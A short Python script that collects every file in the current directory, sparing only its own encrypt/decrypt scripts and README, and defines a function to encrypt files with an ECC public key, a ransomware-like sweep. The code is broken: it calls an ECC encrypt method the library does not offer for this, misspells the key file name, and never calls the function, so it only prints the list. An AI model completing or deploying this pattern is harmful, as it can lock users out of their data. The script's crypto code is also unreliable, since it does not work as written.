from Crypto.PublicKey import ECC
import os

public_key = "publi_key.pem"

files = []

for file in os.listdir():
     if file == "encrypt_files.py" or file == "decrypt_files.py" or file == "README.md":
         continue
     if os.path.isfile(file):
        files.append(file)

def encrypt_file(file_path, public_key_path, output_file_path):
    # Generate an ECC public key from a PEM file
    with open(public_key_path, 'rb') as f:
        ecc_key = ECC.import_key(f.read())

    # Read the file contents
    with open(file_path, 'rb') as f:
        plaintext = f.read()

    # Encrypt the file with the ECC public key
    ciphertext = ecc_key.encrypt(plaintext)

    # Write the encrypted file to the output file
    with open(output_file_path, 'wb') as f:
        f.write(ciphertext)

print(files)